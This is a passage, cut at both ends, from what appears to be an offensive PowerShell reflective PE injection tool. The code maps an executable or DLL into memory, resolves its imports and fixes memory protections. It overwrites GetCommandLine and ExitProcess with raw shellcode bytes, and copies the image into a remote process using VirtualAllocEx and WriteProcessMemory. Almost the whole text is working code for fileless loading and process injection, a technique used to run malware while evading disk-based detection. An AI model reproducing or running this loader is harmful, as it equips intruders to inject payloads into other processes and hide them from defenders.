                            Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
                    
                    $ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    #Cleanup
                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
                }
                
                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
    }

    Function Get-VirtualProtectValue
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt32]
        $SectionCharacteristics
        )
        
        $ProtectionFlag = 0x0
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE
                }
            }
        }
        else
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READONLY
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_NOACCESS
                }
            }
        }
        
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
        {
            $ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
        }
        
        return $ProtectionFlag
    }

    Function Update-MemoryProtectionFlags
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
            [IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
            
            [UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
            [UInt32]$SectionSize = $SectionHeader.VirtualSize
            
            [UInt32]$OldProtectFlag = 0
            Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
            $Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Unable to change memory protection"
            }
        }
    }
    
    #This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
    #Returns an object with addresses to copies of the bytes that were overwritten (and the count)
    Function Update-ExeFunctions
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ExeArguments,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [IntPtr]
        $ExeDoneBytePtr
        )
        
        #This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
        $ReturnArray = @() 
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        [UInt32]$OldProtectFlag = 0
        
        [IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
        if ($Kernel32Handle -eq [IntPtr]::Zero)
        {
            throw "Kernel32 handle null"
        }
        
        [IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
        if ($KernelBaseHandle -eq [IntPtr]::Zero)
        {
            throw "KernelBase handle null"
        }

        #################################################
        #First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
        #   We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
        $CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
        $CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
    
        [IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
        [IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

        if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
        {
            throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
        }

        #Prepare the shellcode
        [Byte[]]$Shellcode1 = @()
        if ($PtrSize -eq 8)
        {
            $Shellcode1 += 0x48 #64bit shellcode has the 0x48 before the 0xb8
        }
        $Shellcode1 += 0xb8
        
        [Byte[]]$Shellcode2 = @(0xc3)
        $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
        
        
        #Make copy of GetCommandLineA and GetCommandLineW
        $GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
        $Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
        $ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
        $ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

        #Overwrite GetCommandLineA
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }
        
        $GetCommandLineAAddrTemp = $GetCommandLineAAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
        
        $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        
        
        #Overwrite GetCommandLineW
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }
        
        $GetCommandLineWAddrTemp = $GetCommandLineWAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
        
        $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        #################################################
        
        
        #################################################
        #For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
        #   I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
        #   It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
        #   argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
        $DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
            , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
        
        foreach ($Dll in $DllList)
        {
            [IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
            if ($DllHandle -ne [IntPtr]::Zero)
            {
                [IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
                [IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
                if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
                {
                    "Error, couldn't find _wcmdln or _acmdln"
                }
                
                $NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
                $NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
                
                #Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
                $OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
                $OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
                $OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                $OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
                $ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
                $ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
                
                $Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
                
                $Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
            }
        }
        #################################################
        
        
        #################################################
        #Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

        $ReturnArray = @()
        $ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
        
        #CorExitProcess (compiled in to visual studio c++)
        [IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
        if ($MscoreeHandle -eq [IntPtr]::Zero)
        {
            throw "mscoree handle null"
        }
        [IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
        if ($CorExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "CorExitProcess address not found"
        }
        $ExitFunctions += $CorExitProcessAddr
        
        #ExitProcess (what non-managed programs use)
        [IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
        if ($ExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "ExitProcess address not found"
        }
        $ExitFunctions += $ExitProcessAddr
        
        [UInt32]$OldProtectFlag = 0
        foreach ($ProcExitFunctionAddr in $ExitFunctions)
        {
            $ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
            #The following is the shellcode (Shellcode: ExitThread.asm):
            #32bit shellcode
            [Byte[]]$Shellcode1 = @(0xbb)
            [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
            #64bit shellcode (Shellcode: ExitThread.asm)
            if ($PtrSize -eq 8)
            {
                [Byte[]]$Shellcode1 = @(0x48, 0xbb)
                [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
            }
            [Byte[]]$Shellcode3 = @(0xff, 0xd3)
            $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
            
            [IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
            Write-Verbose "ExitThreadAddr: $ExitThreadAddr"
            if ($ExitThreadAddr -eq [IntPtr]::Zero)
            {
                Throw "ExitThread address not found"
            }

            $Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            
            #Make copy of original ExitProcess bytes
            $ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
            $Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
            $ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
            
            #Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
            #   call ExitThread
            Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

            $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
        #################################################

        Write-Output $ReturnArray
    }
    
    
    #This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
    #   It copies Count bytes from Source to Destination.
    Function Copy-ArrayOfMemAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Array[]]
        $CopyInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        [UInt32]$OldProtectFlag = 0
        foreach ($Info in $CopyInfo)
        {
            $Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            
            $Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
            
            $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
    }


    #####################################
    ##########    FUNCTIONS   ###########
    #####################################
    Function Get-MemoryProcAddress
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FunctionName
        )
        
        $Win32Types = Get-Win32Types
        $Win32Constants = Get-Win32Constants
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        
        #Get the export table
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
        {
            return [IntPtr]::Zero
        }
        $ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
        $ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
        
        for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
        {
            #AddressOfNames is an array of pointers to strings of the names of the functions exported
            $NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
            $NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
            $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

            if ($Name -ceq $FunctionName)
            {
                #AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
                #    which contains the offset of the function in to the DLL
                $OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
                $FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
                $FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                $FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
                return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
            }
        }
        
        return [IntPtr]::Zero
    }


    Function Invoke-MemoryLoadLibrary
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        $ExeArgs,
        
        [Parameter(Position = 2, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle
        )
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        
        $RemoteLoading = $false
        if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $RemoteLoading = $true
        }
        
        #Get basic PE information
        Write-Verbose "Getting basic PE information from the file"
        $PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
        $OriginalImageBase = $PEInfo.OriginalImageBase
        $NXCompatible = $true
        if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
        {
            Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
            $NXCompatible = $false
        }
        
        
        #Verify that the PE and the current process are the same bits (32bit or 64bit)
        $Process64Bit = $true
        if ($RemoteLoading -eq $true)
        {
            $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
            $Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
            if ($Result -eq [IntPtr]::Zero)
            {
                Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
            }
            
            [Bool]$Wow64Process = $false
            $Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
            if ($Success -eq $false)
            {
                Throw "Call to IsWow64Process failed"
            }
            
            if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
            {
                $Process64Bit = $false
            }
            
            #PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
            $PowerShell64Bit = $true
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $PowerShell64Bit = $false
            }
            if ($PowerShell64Bit -ne $Process64Bit)
            {
                throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
            }
        }
        else
        {
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $Process64Bit = $false
            }
        }
        if ($Process64Bit -ne $PEInfo.PE64Bit)
        {
            Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
        }
        

        #Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
        Write-Verbose "Allocating memory for the PE and write its headers to memory"
        
        [IntPtr]$LoadAddr = [IntPtr]::Zero
        if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
        {
            Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
            [IntPtr]$LoadAddr = $OriginalImageBase
        }

        $PEHandle = [IntPtr]::Zero              #This is where the PE is allocated in PowerShell
        $EffectivePEHandle = [IntPtr]::Zero     #This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
        if ($RemoteLoading -eq $true)
        {
            #Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
            $PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            
            #todo, error handling needs to delete this memory if an error happens along the way
            $EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($EffectivePEHandle -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
            }
        }
        else
        {
            if ($NXCompatible -eq $true)
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            }
            else
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            }
            $EffectivePEHandle = $PEHandle
        }
        
        [IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
        if ($PEHandle -eq [IntPtr]::Zero)
        { 
            Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
        }       
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
        
        
        #Now that the PE is in memory, get more detailed information about it
        Write-Verbose "Getting detailed PE information from the headers loaded in memory"
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
        $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
        Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"
        
        
        #Copy each section from the PE in to memory
        Write-Verbose "Copy PE sections in to memory"
        Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
        
        
        #Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
        Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
        Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

        
        #The PE we are in-memory loading has DLLs it needs, import those DLLs for it
        Write-Verbose "Import DLL's needed by the PE we are loading"
        if ($RemoteLoading -eq $true)
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
        }
        else
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
        }
        
        
        #Update the memory protection flags for all the memory just allocated
        if ($RemoteLoading -eq $false)
        {
            if ($NXCompatible -eq $true)
            {
                Write-Verbose "Update memory protection flags"
                Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
            }
            else
            {
                Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
            }
        }
        else
        {
            Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
        }
        
        
        #If remote loading, copy the DLL in to remote process memory
        if ($RemoteLoading -eq $true)
        {
            [UInt32]$NumBytesWritten = 0
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw "Unable to write shellcode to remote process memory."
            }
        }
        
        
        #Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
        if ($PEInfo.FileType -ieq "DLL")
        {
            if ($RemoteLoading -eq $false)
            {
